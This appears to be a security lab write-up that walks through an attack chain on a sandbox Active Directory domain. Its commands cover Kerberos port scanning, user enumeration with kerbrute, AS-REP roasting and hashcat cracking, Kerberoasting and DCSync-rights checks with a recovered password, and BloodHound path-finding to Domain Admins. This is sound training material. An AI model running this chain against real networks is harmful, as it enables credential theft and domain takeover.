### nmap
```bash
# scanning port 88 shows Kerberos is reachable
nmap -p 88 192.168.100.1
```
<img src="/Sandbox_SecurityLab_1/block1-attacks/src/nmap_res.jpg" width="150" alt="nmap">

### user enumeration
```bash
kerbrute userenum -d corpnet.local --dc 192.168.100.1 usernames.txt -o valid_users.txt
```
<img src="/Sandbox_SecurityLab_1/block1-attacks/src/kerbrute_res.jpg" width="150" alt="nmap">

### AS-REP Roasting Check
```bash
impacket-GetNPUsers corpnet.local/ -usersfile valid_users.txt -dc-ip 192.168.100.1 -format hashcat -no-pass -outputfile asrep_hashes.txt
```
<img src="/Sandbox_SecurityLab_1/block1-attacks/src/asrep_check.jpg" width="150" alt="nmap">

```bash
# crack the hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```
<img src="/Sandbox_SecurityLab_1/block1-attacks/src/hashcat_get_pass.jpg" width="150" alt="nmap">

### ASP Users Check (Kerberoasting candidates)
```bash
impacket-GetUserSPNs corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
```
<img src="/Sandbox_SecurityLab_1/block1-attacks/src/Get_SPN_users.jpg" width="150" 

### DCSync Check (Replication rights on the Domain object)
```bash
impacket-dacledit -action read -target-dn "DC=corpnet,DC=local" corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
```
<img src="/Sandbox_SecurityLab_1/block1-attacks/src/DCSync_check.jpg" width="150"

### Bloodhound
```bash
bloodhound-python -u j.melnyk -p 'P@ssw0rd123' -d corpnet.local -ns 192.168.100.1 -c All

bloodhound-setup

bloodhound-start

# Web UI: http//localhost:8080
```
Shortest path to Domain Admins

<img src="/Sandbox_SecurityLab_1/block1-attacks/src/Tree.jpg" width="150" alt="nmap">

Kerberoasting candidate

<img src="/Sandbox_SecurityLab_1/block1-attacks/src/Kerberoastable_user.jpg" width="150" alt="nmap">

AS-REP Roastable user

<img src="/Sandbox_SecurityLab_1/block1-attacks/src/AS-REP_user.jpg" width="150" alt="nmap">

User with Replicating Rights

<img src="/Sandbox_SecurityLab_1/block1-attacks/src/RepRights_user.jpg" width="150" alt="nmap">